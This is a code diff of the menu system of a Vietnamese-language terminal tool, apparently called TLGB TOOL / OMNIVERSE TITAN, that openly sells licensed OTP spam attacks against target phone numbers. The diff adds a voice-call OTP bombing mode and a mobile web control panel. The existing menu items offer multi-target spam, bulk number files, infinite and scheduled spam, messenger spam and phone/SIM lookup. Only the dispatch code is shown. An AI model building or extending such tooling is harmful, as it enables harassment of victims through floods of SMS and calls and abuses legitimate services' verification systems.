+                    print(f"\n\033[38;2;0;229;255m┌─[\033[1;38;2;255;215;0m👑 ADMIN\033[0;38;2;0;229;255m]─[\033[38;2;168;85;247mv{TOOL_VERSION}\033[38;2;0;229;255m]\033[0m")
+                    choice = input(f"\033[38;2;0;229;255m└─► \033[1;38;2;255;255;255mNhập lệnh [0-30, M, G, C, D]: \033[0m").strip().upper()
+                else:
+                    print(f"\n\033[38;2;0;229;255m┌──[\033[1;38;2;255;215;0m👑 ADMIN VIP: {AUTHOR_NAME}\033[0;38;2;0;229;255m]──[\033[38;2;168;85;247m⚡ OMNIVERSE TITAN v{TOOL_VERSION}\033[38;2;0;229;255m]\033[0m")
+                    choice = input(f"\033[38;2;0;229;255m└─► \033[1;38;2;255;255;255mNhập lệnh điều khiển [0-30, M, G, C, D]: \033[0m").strip().upper()
 
-                if choice in ["G", "GUI", "UI"]:
+                if choice in ["M", "WEB", "MOBILE", "PHONE", "HTTP", "SERVER"]:
+                    run_mobile_web_server()
+                elif choice in ["G", "GUI", "UI"]:
                     run_master_gui()
+                elif choice in ["C", "CALL", "VOICE", "CALLOTP", "PHONE_CALL"]:
+                    voice_call_otp_spam_flow()
                 elif choice in ["28", "CHECK", "SDT", "PHONE", "LOOKUP", "SIM", "INFO"]:
                     phone_intel_lookup_flow()
+                elif choice in ["29", "SYS", "MONITOR", "HARDWARE"]:
+                    cyber_system_monitor_hud()
+                elif choice in ["30", "MATRIX", "SCREEN", "SAVER"]:
+                    matrix_screensaver_3d()
                 elif choice in ["24", "BATCH"]:
                     admin_batch_generate_keys_flow()
                 elif choice in ["25", "BACKUP"]:
@@ -14866,7 +16726,7 @@ if __name__ == "__main__":
                     admin_user_manager_flow()
                 elif choice in ["13", "UPDATE", "UP"]:
                     admin_publish_update_flow()
-                elif choice in ["14", "CHAT", "C"]:
+                elif choice in ["14", "CHAT"]:
                     cloud_community_chat_flow()
                 elif choice in ["15", "TITLE", "BADGE"]:
                     chat_title_customizer_flow()
@@ -14896,12 +16756,14 @@ if __name__ == "__main__":
         else:
             while True:
                 user_items = [
-                    ('─── ⚡ HỎA LỰC TẤN CÔNG OTP ───', ''),
+                    ('─── ⚡ HỎA LỰC TẤN CÔNG OTP & CALL ───', ''),
+                    ('[ M] 📱 Giao Diện Web Điện Thoại', 'Khởi Chạy Web Server Điều Khiển Trên ĐT'),
                     ('[ G] 🖥️ Giao Diện Đồ Họa GUI', 'Khởi Chạy Modern Desktop Cyberpunk GUI'),
-                    ('[01] 🚀 Bắt Đầu Spam OTP', 'Chạy Tiến Trình Spam Đầy Đủ 72 Cổng'),
+                    ('[ C] 📞 Bắn Cuộc Gọi (Call OTP)', 'Tổng Đài Gọi Điện Thoại Đọc Mã OTP Liên Tục'),
+                    ('[01] 🚀 Bắt Đầu Spam OTP', 'Chạy Tiến Trình Spam Đầy Đủ Cổng Dịch Vụ'),
                     ('[02] ⚡ Ma Trận Đa Mục Tiêu', 'Bắn Song Song 2-10 Số Điện Thoại Cùng Lúc'),
                     ('[03] ⭐ Mục Tiêu Yêu Thích', 'Quản Lý SĐT Ưa Thích & Bắn Nhanh 1-Click'),
-                    ('[04] 🎯 Bắn Theo Chuyên Mục', 'Phân Loại Cổng Thương Mại, Ngân Hàng, App'),
+                    ('[04] 🎯 Bắn Theo Chuyên Mục', 'Phân Loại Cổng Thương Mại, Ngân Hàng, App, Call'),
                     ('[05] 📁 Bắn Theo File SĐT', 'Nạp File Text Hàng Loạt Thuê Bao Tự Động'),
                     ('[06] ♾️ Bắn Vô Hạn (Infinite)', 'Chế Độ Xuyên Màn Đêm Tự Động Lặp Lại'),
                     ('[07] ⏱️ Hẹn Giờ Tự Động Bắn', 'Lên Lịch Đếm Ngược Tự Động Kích Hoạt'),
@@ -14909,27 +16771,42 @@ if __name__ == "__main__":
                     ('[08] 💬 Nhóm Chat Cộng Đồng', 'Phòng Chat Trực Tuyến Realtime Toàn Cầu'),
                     ('[09] 👑 Danh Hiệu & Avatar VIP', 'Tùy Biến Danh Hiệu Phát Sáng Chat'),
                     ('─── 🎮 GIẢI TRÍ, AI & TRA CỨU ───', ''),
-                    ('[10] 🎮 Cyber Arcade Mini-Game', '8 Game Đổi Thưởng, Xì Dách, Mystery Box'),
-                    ('[11] 🤖 Trợ Lý AI Assistant', 'Gemini Flash Lite Hỏi Đáp & Tra Cứu'),
+                    ('[10] 🎮 Cyber Arcade (11 Games)', 'Snake, Caro Minimax AI, Wordle, Blackjack'),
+                    ('[11] 🤖 Trợ Lý AI Gemini Multi-Mode', '4 Chế Độ: Coder, Dịch Thuật, Logic & Chat'),
                     ('[12] 🏆 Bảng Xếp Hạng Cao Thủ', 'Top EXP & Cống Hiến Toàn Cầu Realtime'),
                     ('[13] 🎨 Đổi Theme Màu Sắc', '7 Bộ Màu Neon Matrix, Synthwave, Solar'),
                     ('[14] 🐛 Báo Cáo Lỗi Cho Admin', 'Gửi Phản Hồi Trực Tiếp Tới Quản Trị Viên'),
                     ('[15] 📰 Bản Tin & Nhật Ký v6.5', 'Xem Thông Báo & Tính Năng Mới Toàn Cầu'),
                     ('[16] 🛠️ Tool TikTok & Tin Nhắn', 'Chạy Tool TikTok & Spam Mess GUI 1-Click'),
                     ('[17] 🔍 Tra Cứu & Check SĐT Chuyên Sâu', 'Kiểm Tra Nhà Mạng, Khóa 2 Chiều, Định Danh SIM'),
+                    ('[18] 📊 Cyber System Monitor HUD', 'Giám Sát Phần Cứng Realtime & Ping ms [NEW]'),
+                    ('[19] 🌌 3D Matrix Screensaver', 'Màn Hình Chờ 3D Đổi 5 Màu Neon [NEW]'),
                     ('─── 🚪 HỆ THỐNG & ĐIỀU KHIỂN ───', ''),
                     ('[ D] 🔑 Đăng Xuất / Xóa Key', 'Thu Hồi Key Đã Lưu Khỏi Thiết Bị'),
                     ('[ 0] ❌ Thoát Chương Trình', 'Đóng Tool An Toàn')
                 ]
                 print_aligned_menu_box(f"👤 TLGB TOOL v{TOOL_VERSION} - BẢNG ĐIỀU KHIỂN NGƯỜI DÙNG 👤", user_items, left_col_w=32, inner_w=78, color_offset=2)
 
-                print(f"\n\033[38;2;0;229;255m┌──[\033[1;38;2;0;240;255m👤 USER LICENSE\033[0;38;2;0;229;255m]──[\033[38;2;168;85;247m⚡ TITAN v{TOOL_VERSION}\033[38;2;0;229;255m]\033[0m")
-                u_choice = input(f"\033[38;2;0;229;255m└─► \033[1;38;2;255;255;255mNhập lựa chọn của bạn [0-17, G, D]: \033[0m").strip().upper()
+                term_cols = shutil.get_terminal_size((80, 24)).columns
+                if term_cols < 60:
+                    print(f"\n\033[38;2;0;229;255m┌─[\033[1;38;2;0;240;255m👤 USER\033[0;38;2;0;229;255m]─[\033[38;2;168;85;247mv{TOOL_VERSION}\033[38;2;0;229;255m]\033[0m")
+                    u_choice = input(f"\033[38;2;0;229;255m└─► \033[1;38;2;255;255;255mNhập lựa chọn [0-19, M, G, C, D]: \033[0m").strip().upper()
+                else:
+                    print(f"\n\033[38;2;0;229;255m┌──[\033[1;38;2;0;240;255m👤 USER LICENSE\033[0;38;2;0;229;255m]──[\033[38;2;168;85;247m⚡ TITAN v{TOOL_VERSION}\033[38;2;0;229;255m]\033[0m")
+                    u_choice = input(f"\033[38;2;0;229;255m└─► \033[1;38;2;255;255;255mNhập lựa chọn của bạn [0-19, M, G, C, D]: \033[0m").strip().upper()
 
-                if u_choice in ["G", "GUI", "UI"]:
+                if u_choice in ["M", "WEB", "MOBILE", "PHONE", "HTTP", "SERVER"]:
+                    run_mobile_web_server()
+                elif u_choice in ["G", "GUI", "UI"]:
                     run_master_gui()
+                elif u_choice in ["C", "CALL", "VOICE", "CALLOTP", "PHONE_CALL"]:
+                    voice_call_otp_spam_flow()
                 elif u_choice in ["17", "CHECK", "SDT", "PHONE", "LOOKUP", "SIM", "INFO"]:
                     phone_intel_lookup_flow()
+                elif u_choice in ["18", "SYS", "MONITOR", "HARDWARE"]:
+                    cyber_system_monitor_hud()
+                elif u_choice in ["19", "MATRIX", "SCREEN", "SAVER"]:
+                    matrix_screensaver_3d()
                 elif u_choice in ["1", "01"]:
                     while True:
                         phone = input(f"\n{Fore.CYAN}[?] Nhập số điện thoại mục tiêu: {Style.RESET_ALL}").strip()
@@ -14976,7 +16853,7 @@ if __name__ == "__main__":
                     admin_infinite_spam()
                 elif u_choice in ["7", "07"]:
                     admin_scheduled_spam()
-                elif u_choice in ["8", "08", "C", "CHAT"]:
+                elif u_choice in ["8", "08", "CHAT"]:
                     cloud_community_chat_flow()
                 elif u_choice in ["9", "09", "TITLE", "BADGE"]:
                     chat_title_customizer_flow()
